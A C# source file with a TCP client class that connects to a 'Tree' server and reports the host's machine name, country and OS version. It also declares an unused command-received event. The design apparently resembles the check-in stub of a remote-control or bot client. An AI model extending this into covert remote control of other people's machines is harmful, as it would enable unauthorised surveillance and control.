using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Globalization;

namespace Branch
{
    public class BranchClass
    {
        private bool connected;
        private string ReturnLastError;
        private TcpClient Client;
        private byte[] received = new byte[1024];
        private StringBuilder ReceivedBuffer = new StringBuilder();
        private StringBuilder LastBuffer = new StringBuilder();
        private StringBuilder PrevBuffer = new StringBuilder();

        public delegate void BranchConnectedEvent(BranchClass client);
        public event BranchConnectedEvent BranchConnected;

        public delegate void BranchDisconnectedEvent(BranchClass client, string Error);
        public event BranchDisconnectedEvent BranchDisconnected;

        public delegate void CommandReceivedEvent(BranchClass client, string command);
        public event CommandReceivedEvent CommandReceived;

        public void ConnectToTree(string server, int port)
        {
            try
            {
                Client = new TcpClient(server, port);
                NetworkStream stream = Client.GetStream();

                connected = true;

                string CompName = Environment.MachineName.ToString();
                string OS = Environment.OSVersion.ToString();
                string culture = CultureInfo.CurrentCulture.EnglishName;
                string Country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);

                string data = CompName + "," + Country + "," + OS;
                Write(data);

                if (BranchConnected != null) BranchConnected(this);
            }
            catch (Exception e)
            {
                ReturnLastError = e.Message;
            }
        }

        public void Write(string data)
        {
            StreamWriter writer = new StreamWriter(Client.GetStream());
            writer.Write(data);
            writer.Flush();
        }

        public void Disconnect()
        {
            Client.Close();
        }
    }
}
